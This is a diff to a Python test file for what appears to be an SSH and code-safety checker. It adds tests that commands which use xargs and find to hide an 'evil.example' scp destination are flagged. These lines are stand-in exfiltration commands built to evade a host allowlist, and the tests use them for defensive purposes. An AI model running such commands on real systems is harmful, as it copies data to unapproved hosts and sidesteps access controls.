@@ -953,3 +953,16 @@ def test_inline_lambda_requires_approval():
     assert _check_code_safety(code, session_id = "review") is not None
     approve_hosts("review", ["evil.example"])
     assert _check_code_safety(code, session_id = "review") is None
+
+
+@pytest.mark.parametrize(
+    "command",
+    [
+        "printf 'evil.example:/dest' | xargs scp -3 -F none approved.example:/source",
+        "printf 'evil.example:/dest' | xargs env scp -3 -F none approved.example:/source",
+        "find . -exec xargs scp -3 -F none approved.example:/source {} +",
+    ],
+)
+def test_xargs_unknown_operands_fail_closed(command):
+    approve_hosts("review", ["approved.example"])
+    assert check_ssh_command_access(command, "review") is not None
